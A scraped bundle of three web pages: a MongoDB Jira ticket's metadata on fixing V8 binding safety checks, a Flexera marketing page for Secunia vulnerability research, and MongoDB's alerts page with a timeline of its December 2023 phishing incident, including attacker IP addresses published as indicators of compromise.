=== Content from jira.mongodb.org_d0d05336_20250125_191326.html ===


[Log in](/login.jsp?os_destination=%2Fbrowse%2FSERVER-9878)[Skip to main content](#main)[Skip to sidebar](#sidebar)[![MongoDB Jira](/s/-1w64q3/9160001/fy41z4/_/jira-logo-scaled.png)](https://jira.mongodb.org/secure/MyJiraHome.jspa)

* [Dashboards](/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/secure/BrowseProjects.jspa "View recent projects and browse a list of projects")
* [Issues](/issues/ "Search for issues and view recent issues")
* [eazyBI](/plugins/servlet/eazybi)

* Give feedback to Atlassian
* [Help](/secure/ViewKeyboardShortcuts%21default.jspa "Help")
  + [Keyboard Shortcuts](/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/login.jsp?os_destination=%2Fbrowse%2FSERVER-9878)
  + [Acknowledged notifications](/plugins/servlet/wittified/profile/notifications)

![Uploaded image for project: 'Core Server'](https://jira.mongodb.org/secure/projectavatar?pid=10000&avatarId=13900)

1. [Core Server](/browse/SERVER)
2. [SERVER-9878](/browse/SERVER-9878)

## Add safety checks to V8 C++ bindings

Schedule Issue[Undo Transition](/secure/UndoTransition%21default.jspa?id=78298)ClosedExportnullXMLWordPrintableJSON
### Details

* **Type:**
  ![Icon: Bug](/secure/viewavatar?size=xsmall&avatarId=14703&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.") Bug
* **Resolution:**
  Done
* **Priority:**
  ![Icon: Major - P3](/images/icons/priorities/major.svg "Major - P3 - Major loss of function.") Major - P3
* **Fix Version/s:**
  [2.4.5](/issues/?jql=project+%3D+SERVER+AND+fixVersion+%3D+2.4.5 "2.4.5 "), [2.5.1](/issues/?jql=project+%3D+SERVER+AND+fixVersion+%3D+2.5.1 "2.5.1 Development Release")
* **Affects Version/s:**
  2.4.4
* **Component/s:**
  [JavaScript](/issues/?jql=project+%3D+SERVER+AND+component+%3D+JavaScript "JavaScript ")
* **Labels:**
  + [asp](/issues/?jql=labels+%3D+asp "asp")
  + [asp-cve](/issues/?jql=labels+%3D+asp-cve "asp-cve")
  + [asp-sdl-internal](/issues/?jql=labels+%3D+asp-sdl-internal "asp-sdl-internal")
  + [asp-vuln-mem](/issues/?jql=labels+%3D+asp-vuln-mem "asp-vuln-mem")

* **Backwards Compatibility:**
  Minor Change
* **Operating System:**
  ALL

### Attachments

### Issue Links

is depended on by

![Task - A task that needs to be done.](/secure/viewavatar?size=xsmall&avatarId=14718&avatarType=issuetype "Task - A task that needs to be done.")
[SERVER-9582](/browse/SERVER-9582)
V8 allows DBRef() with no arguments

* ![Minor - P4 - Minor loss of function, or other problem where easy workaround is present.](/images/icons/priorities/minor.svg "Minor - P4 - Minor loss of function, or other problem where easy workaround is present.")
* Closed

### Activity

### People

Assignee:
![mathias@mongodb.com](https://jira.mongodb.org/secure/useravatar?size=small&avatarId=10122)
Mathias Stearn

Reporter:
![mathias@mongodb.com](https://jira.mongodb.org/secure/useravatar?size=small&avatarId=10122)
Mathias Stearn

Participants:

[auto](/secure/IssueNavigator.jspa?reset=true&customfield_10051=auto "Find all issues auto participated in"), [Mathias Stearn](/secure/IssueNavigator.jspa?reset=true&customfield_10051=mathias%40mongodb.com "Find all issues Mathias Stearn participated in")

Votes:
0
Vote for this issue

Watchers:
3
Start watching this issue

### Dates

Created:

Jun 07 2013 08:36:18 PM UTC

Updated:

Jun 07 2017 07:04:16 PM UTC

Resolved:

Jun 17 2013 11:15:11 PM UTC

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for MongoDB. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)



=== Content from secunia.com_03b90974_20250125_191320.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from www.mongodb.org_b4e0633e_20250125_191324.html ===


[NEWGet the latest CVEs, security bulletins, and incident updates on our Security Bulletins page. Learn more >](https://www.mongodb.com/resources/products/mongodb-security-bulletins)[![MongoDB logo](https://webimages.mongodb.com/_com_assets/cms/kuyjf3vea2hg34taa-horizontal_default_slate_blue.svg?auto=format%252Ccompress)](https://www.mongodb.com)General Information

* General Information
* Documentation
* Developer Articles & Topics
* Community Forums
* Blog
* University
![search icon](https://webimages.mongodb.com/_com_assets/cms/lyj1z1iiimsre0lsz-search_updated_white.svg?auto=format%252Ccompress)

* ProductsPlatform[![atlas_product_family](https://webimages.mongodb.com/_com_assets/icons/atlas_product_family.svg)AtlasBuild on a developer data platform](https://www.mongodb.com/atlas)Platform Services[![atlas_database](https://webimages.mongodb.com/_com_assets/icons/atlas_database.svg)DatabaseDeploy a multi-cloud database](https://www.mongodb.com/products/platform/atlas-database)[![atlas_search](https://webimages.mongodb.com/_com_assets/icons/atlas_search.svg)SearchDeliver engaging search experiences](https://www.mongodb.com/products/platform/atlas-search)[![mdb_vector_search](https://webimages.mongodb.com/_com_assets/icons/mdb_vector_search.svg)Vector SearchDesign intelligent apps with gen AI](https://www.mongodb.com/products/platform/atlas-vector-search)[![atlas_stream_processing](https://webimages.mongodb.com/_com_assets/icons/atlas_stream_processing.svg)Stream ProcessingUnify data in motion and data at rest](https://www.mongodb.com/products/platform/atlas-stream-processing)Self Managed[![enterprise_advanced_product family](https://webimages.mongodb.com/_com_assets/icons/enterprise_advanced_product family.svg)Enterprise AdvancedRun and manage MongoDB yourself](https://www.mongodb.com/products/self-managed/enterprise-advanced)[![community_edition_product_family](https://webimages.mongodb.com/_com_assets/icons/community_edition_product_family.svg)Community EditionDevelop locally with MongoDB](https://www.mongodb.com/products/self-managed/community-edition)Tools[![mdb_compass](https://webimages.mongodb.com/_com_assets/icons/mdb_compass.svg)CompassWork with MongoDB data in a GUI](https://www.mongodb.com/products/tools/compass)[![atlas_integration](https://webimages.mongodb.com/_com_assets/icons/atlas_integration.svg)IntegrationsIntegrations with third-party services](https://cloud.mongodb.com/ecosystem/?filter=integration)[![mdb_migrator](https://webimages.mongodb.com/_com_assets/icons/mdb_migrator.svg)Relational MigratorMigrate to MongoDB with confidence](https://www.mongodb.com/products/tools/relational-migrator)[View All ProductsExplore our full developer suitearrow-right](https://www.mongodb.com/products)[MongoDB 8.0Our fastest version everarrow-right](https://www.mongodb.com/products/updates/version-release)Build with MongoDB AtlasGet started for free in minutes[Sign Up](https://www.mongodb.com/cloud/atlas/register)Test Enterprise AdvancedDevelop with MongoDB on-premises[Download](https://www.mongodb.com/try/download/enterprise)Try Community EditionExplore the latest version of MongoDB[Download](https://www.mongodb.com/try/download/community)
* ResourcesDocumentation[Atlas DocumentationGet started using Atlas](https://www.mongodb.com/docs/atlas/)[Server DocumentationLearn to use MongoDB](https://www.mongodb.com/docs/manual/)[Start With GuidesGet step-by-step guidance for key tasks](https://www.mongodb.com/docs/guides/) [Tools and ConnectorsLearn how to connect to MongoDB](https://www.mongodb.com/docs/tools-and-connectors/)[MongoDB DriversUse drivers and libraries for MongoDB](https://www.mongodb.com/docs/drivers/)[Resources HubGet help building the next big thing with MongoDBarrow-right](https://www.mongodb.com/resources)Connect[![atlas_product_family](https://webimages.mongodb.com/_com_assets/icons/atlas_product_family.svg)Developer CenterExplore a wide range of developer resources](https://www.mongodb.com/developer/)[![general_events_ask_the_experts](https://webimages.mongodb.com/_com_assets/icons/general_events_ask_the_experts.svg)CommunityJoin a global community of developers](https://www.mongodb.com/community/)[![general_content_tutorial](https://webimages.mongodb.com/_com_assets/icons/general_content_tutorial.svg)Courses and CertificationLearn for free from MongoDB](https://learn.mongodb.com/)[![general_events_session](https://webimages.mongodb.com/_com_assets/icons/general_events_session.svg)Events and WebinarsFind an event or webinar near you](https://www.mongodb.com/events)
* SolutionsUse cases[Artificial Intelligence](https://www.mongodb.com/solutions/use-cases/artificial-intelligence)[Payments](https://www.mongodb.com/solutions/use-cases/payments)[Serverless Development](https://www.mongodb.com/solutions/use-cases/serverless)[Gaming](https://www.mongodb.com/solutions/use-cases/gaming)Industries[Financial Services](https://www.mongodb.com/solutions/industries/financial-services)[Telecommunications](https://www.mongodb.com/solutions/industries/telecommunications)[Healthcare](https://www.mongodb.com/solutions/industries/healthcare)[Retail](https://www.mongodb.com/solutions/industries/retail)[Public Sector](https://www.mongodb.com/solutions/industries/public-sector)[Manufacturing](https://www.mongodb.com/solutions/industries/manufacturing)[Solutions LibraryOrganized and tailored solutions to kick-start projectsarrow-right](https://www.mongodb.com/solutions/solutions-library)Developer Data PlatformAccelerate innovation at scale[Learn morearrow-right](https://www.mongodb.com/solutions/developer-data-platform)Startups and AI InnovatorsFor world-changing ideas and AI pioneers[Learn morearrow-right](https://www.mongodb.com/solutions/startups)Customer Case StudiesHear directly from our users[See Storiesarrow-right](https://www.mongodb.com/solutions/customer-case-studies)
* Company[CareersStart your next adventure](https://www.mongodb.com/company/careers)[BlogRead articles and announcements](https://www.mongodb.com/blog)[NewsroomRead press releases and news stories](https://www.mongodb.com/company/newsroom)[PartnersLearn about our partner ecosystem](https://www.mongodb.com/company/partners)[LeadershipMeet our executive team](https://www.mongodb.com/company/leadership)[CompanyLearn more about who we are](https://www.mongodb.com/company)Contact UsReach out to MongoDB[Let’s chatarrow-right](https://www.mongodb.com/company/contact)InvestorsVisit our investor portal[Learn morearrow-right](https://investors.mongodb.com/)
* [Pricing](https://www.mongodb.com/pricing)

![Search](https://webimages.mongodb.com/_com_assets/cms/lyekm5ifrkqjod0wu-search_updated.svg?auto=format%252Ccompress)[Support](https://www.mongodb.com/services/support)[Sign In](https://account.mongodb.com/account/login)[Try Free](https://www.mongodb.com/cloud/atlas/register)menu-vertical[![MongoDB logo](https://webimages.mongodb.com/_com_assets/cms/kuyjf3vea2hg34taa-horizontal_default_slate_blue.svg?auto=format%252Ccompress)](https://www.mongodb.com)![Search](https://webimages.mongodb.com/_com_assets/cms/lyekm5ifrkqjod0wu-search_updated.svg?auto=format%252Ccompress)
## MongoDB Alerts

This page lists critical alerts and advisories for MongoDB.
See the [MongoDB JIRA](https://jira.mongodb.org/secure/BrowseProjects.jspa) for a comprehensive list of bugs and feature requests.

[General](#general)[Data integrity related](#data)[Operations Related](#operations)[Security Related](/resources/products/mongodb-security-bulletins)
## General

![]()
#### MongoDB Security Notice

**1/23/24 - 6:00 PM EST**

MongoDB has published a [Post Event Summary](https://www.mongodb.com/blog/post/mongodb-security-incident-post-event-summary-january-23-2023) for the security incident first reported here on December 16, 2023, US Eastern time (EST). As a reminder, our investigation is complete and closed, with our findings verified by our third-party forensic experts.

**1/03/24 - 5:00 PM EST**

Our investigation of the security incident first reported here on December 16, 2023, US Eastern time (EST) is now **complete and closed**.

The investigation led by our security and engineering teams uncovered no evidence of unauthorized access to MongoDB Atlas clusters. This finding has been verified by our third-party forensic experts.

We are committed to being timely and transparent with details about this Security Incident. We plan to release a post event summary as soon as practicable.

[All updates >](#mdb-modal-more)

**1/23/24 - 6:00 PM EST**

MongoDB has published a [Post Event Summary](https://www.mongodb.com/blog/post/mongodb-security-incident-post-event-summary-january-23-2023) for the security incident first reported here on December 16, 2023, US Eastern time (EST). As a reminder, our investigation is complete and closed, with our findings verified by our third-party forensic experts.

**1/03/24 - 5:00 PM EST**

Our investigation of the security incident first reported here on December 16, 2023, US Eastern time (EST) is now **complete and closed**.

The investigation led by our security and engineering teams uncovered no evidence of unauthorized access to MongoDB Atlas clusters. This finding has been verified by our third-party forensic experts.

We are committed to being timely and transparent with details about this Security Incident. We plan to release a post event summary as soon as practicable.

**12/20/23 - 9:00 PM EST**

We continue to find **no evidence of unauthorized access to MongoDB Atlas clusters or the Atlas cluster authentication system**.

Based on the investigation to date, the unauthorized third party used a phishing attack to gain access to some of the corporate applications that we use to provide support services to MongoDB customers. In collaboration with outside forensic experts, we currently have a high level of confidence that the unauthorized third party has been removed from our corporate applications and that this incident is contained.

We have identified a list of contact information and related account metadata that the unauthorized third party accessed from the compromised applications. We are providing the list of fields in the blog post linked below, along with incremental guidance about the indicators of compromise (IOCs) provided in our previous alert.

[Read the blog for details](https://www.mongodb.com/blog/post/mongodb-security-incident-update-december-20-2023)

As previously disclosed, the unauthorized third party primarily accessed MongoDB customer contact information and related account metadata. Over the last 24 hours, MongoDB personnel have individually contacted any customers with exposure beyond the fields listed in our blog post. This was a separate communication from the initial security notice sent over this past weekend.

Moving forward, we will provide updates when we have notable new information.

**12/18/23 - 9:00 PM EST**

We continue to find **no evidence of unauthorized access to MongoDB Atlas clusters or the Atlas cluster authentication system**. Our investigation and work with the relevant authorities is ongoing. MongoDB will update this alert page with pertinent information as we further investigate the matter.

At this time, as a result of our investigation in collaboration with outside experts, we have high confidence that we were victims of a phishing attack. Through our investigation, we have identified certain information that may be helpful to protect yourself against a potential attack by this unauthorized party:

**Indicators of Compromise (IOCs)**

The unauthorized party used the Mullvad VPN. Mullvad has many external IP addresses, and there are many VPNs that can be used to hide an IP address. In this case, we saw malicious activity coming from the following IP addresses:

+ 107.150.22.47

+ 138.199.6.199

+ 146.70.187.157

+ 179.43.189.85

+ 185.156.46.165

+ 198.44.136.69

+ 198.44.136.71

+ 198.44.140.133

+ 198.44.140.199

+ 199.116.118.207

+ 206.217.205.88

+ 66.63.167.152

+ 66.63.167.154

+ 87.249.134.10

+ 96.44.191.132

We recommend using the above information to search your networks for suspicious activity. We are committed to being as transparent in this process as we can and providing information so you can assess risk in your network.

In regards to our previous guidance, [here](https://www.mongodb.com/docs/atlas/security-multi-factor-authentication/) are instructions on how to enable phishing-resistant MFA on MongoDB’s native cloud authentication service. MongoDB Cloud also supports federating your identity from your IDP, please see [here](https://www.mongodb.com/docs/atlas/security/federated-authentication/).

We have fielded questions from some customers about the authenticity of the e-mail titled: MongoDB Security Notice that our Chief Information Security Officer, Lena Smart, sent over the weekend from mongodbteam@mail1.mongodb.com. We can confirm that this email is legitimate.

**12/17/23 - 9:00 PM EST**

At this time, we have found **no evidence of unauthorized access to MongoDB Atlas clusters.** To be clear, we have not identified any security vulnerability in any MongoDB product as a result of this incident. It is important to note that MongoDB Atlas cluster access is authenticated via a separate system from MongoDB corporate systems, and we have found no evidence that the Atlas cluster authentication system has been compromised.

We are aware of unauthorized access to some corporate systems that contain customer names, phone numbers, and email addresses among other customer account metadata, including system logs for one customer. We have notified the affected customer. At this time, we have found no evidence that any other customers’ system logs were accessed.

We are continuing with our investigation, and are working with relevant authorities and forensic firms. MongoDB will update this alert page with additional information as we continue to investigate the matter.

**12/16/2023 - 05:25 PM EST**

We are experiencing a spike in login attempts resulting in issues for customers attempting to log in to Atlas and our Support Portal. This is unrelated to the security incident. Please try again in a few minutes if you are still having trouble logging in. **[The issue involving user login attempts has been resolved as of 10:22 PM EST]**

**12/16/2023 - 03:00 PM EST**

MongoDB is actively investigating a security incident involving unauthorized access to certain MongoDB corporate systems, which includes exposure of customer account metadata and contact information. We detected suspicious activity on Wednesday (Dec. 13th, 2023) evening US Eastern Standard Time, immediately activated our incident response process, and believe that this unauthorized access has been going on for some period of time before discovery. **At this time, we are not aware of any exposure to the data that customers store in MongoDB Atlas.** Nevertheless, we recommend that customers be vigilant for social engineering and phishing attacks, activate phishing-resistant multi-factor authentication (MFA), and regularly rotate their MongoDB Atlas passwords. MongoDB will update this alert page with additional information as we continue to investigate the matter.

## Data Integrity Related

**12/11/2024**
####

